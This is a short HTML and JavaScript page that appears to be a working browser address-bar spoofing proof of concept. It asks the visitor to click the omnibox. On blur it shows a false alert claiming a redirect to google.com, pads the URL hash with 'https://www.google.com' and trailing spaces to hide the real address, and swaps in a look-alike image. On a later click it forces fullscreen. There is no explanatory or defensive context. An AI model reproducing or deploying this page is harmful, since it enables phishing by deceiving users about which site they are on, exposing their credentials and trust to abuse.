<body>

	<img id="img" style="display: none;" src="https://i.imgur.com/pkg3Z6H.png"></img>

	<div id="content">
		<center>
			<br>
			<h1>Click on the omnibox</h1>
		</center>
	</div>

</body>

<script>

var spoofed = false;

window.onblur = function() {

	if (!spoofed) {
		alert("You are being redirected to https://www.google.com");
		location.hash = "  https://www.google.com                                                                                                                                                                                                                                     ";
		document.getElementById("img").style.display = "block";
		document.getElementById("content").style.display = "none";
		spoofed = true;
	}

};

window.onclick = function() {
	if (spoofed) {
		document.documentElement.webkitRequestFullScreen();
	}
}

</script>
